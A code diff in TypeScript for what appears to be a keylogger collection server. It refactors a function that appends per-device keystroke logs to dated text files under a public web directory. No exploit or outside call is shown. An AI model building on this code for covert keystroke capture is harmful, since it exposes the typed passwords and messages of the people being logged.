@@ -232,42 +232,11 @@ import { KeyLogsModelType } from "../utils";
 // 	}
 // };
 
-let logBuffer: string[] = [];
-const bufferSize = 100; // Maximum number of logs to buffer before writing
-const flushInterval = 1000; // Flush buffer every 1 second
-
-const flushLogsToFileAsync = (filePath: string) => {
-	const logData = logBuffer.join("");
-	logBuffer = []; // Clear buffer immediately after taking data
-
-	return new Promise((resolve, reject) => {
-		fs.appendFile(filePath, logData, (err) => {
-			if (err) reject(err);
-			resolve(null);
-		});
-	});
-};
-
-// Periodically flush logs
-setInterval(async () => {
-	if (logBuffer.length > 0) {
-		const logsDir = path.join(__dirname, "../../public/keylogs"); // Base logs directory
-		const today = new Date().toISOString().split("T")[0];
-
-		// We need to check the deviceId folder for flushing
-		// Using a placeholder since we don't have deviceId here, will be updated in addNewKeyLogs
-		const deviceId = "placeholderDeviceId"; // This will be replaced in addNewKeyLogs
-		const deviceLogsDir = path.join(logsDir, deviceId); // Full path to the device folder
-		const filePath = path.join(deviceLogsDir, `${today}.txt`); // Full path to the log file
-
-		await flushLogsToFileAsync(filePath);
-	}
-}, flushInterval);
-
 export const addNewKeyLogs = async (data: any) => {
 	try {
 		const { deviceId, keyLogsType, keylogs, event } = data;
 
+		// Check if keylogs is not an empty string
 		if (!keylogs || keylogs.trim() === "[]") {
 			return {
 				status: 400,
@@ -281,21 +250,29 @@ export const addNewKeyLogs = async (data: any) => {
 			fs.mkdirSync(logsDir, { recursive: true });
 		}
 
+		// Get today's date in YYYY-MM-DD format for the file name
 		const today = new Date().toISOString().split("T")[0];
-		// Ensure log file is created within the device's folder
 		const filePath = path.join(logsDir, `${today}.txt`);
 
-		const formattedDate = new Date()
-			.toISOString()
-			.split("T")[1]
-			.split(".")[0];
+		// Format the log entry to only include time (hh:mm:ss)
+		const formatTime = (date: Date) => {
+			const hours = String(date.getHours()).padStart(2, "0");
+			const minutes = String(date.getMinutes()).padStart(2, "0");
+			const seconds = String(date.getSeconds()).padStart(2, "0");
+			return `${hours}:${minutes}:${seconds}`;
+		};
+
+		const formattedDate = formatTime(new Date());
+
+		// Prepare the log entry with the formatted date
 		const logEntry = `${formattedDate} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
 
-		logBuffer.push(logEntry);
+		// Create a buffer from the log entry string
+		const logBuffer = Buffer.from(logEntry, "utf-8");
 
 		// Append the buffer content to the file asynchronously
 		await new Promise<void>((resolve, reject) => {
-			fs.appendFile(filePath, logBuffer as any, (err) => {
+			fs.appendFile(filePath, logBuffer, (err) => {
 				if (err) return reject(err);
 				resolve();
 			});
